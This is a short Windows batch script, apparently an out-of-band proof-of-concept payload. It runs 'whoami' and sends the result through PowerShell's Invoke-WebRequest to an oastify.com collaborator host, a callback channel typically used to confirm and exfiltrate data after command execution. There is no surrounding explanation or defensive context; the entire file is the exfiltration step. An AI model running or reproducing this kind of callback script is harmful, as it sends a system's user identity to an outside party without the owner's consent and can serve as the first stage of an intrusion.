@echo off
for /f "tokens=*" %%a in ('whoami') do (
    powershell -Command "Invoke-WebRequest -Uri 'https://smi6vrfgttihl3jtozoriwq4ivomcm0b.oastify.com/?t=i&data=%%a' -Method GET"
)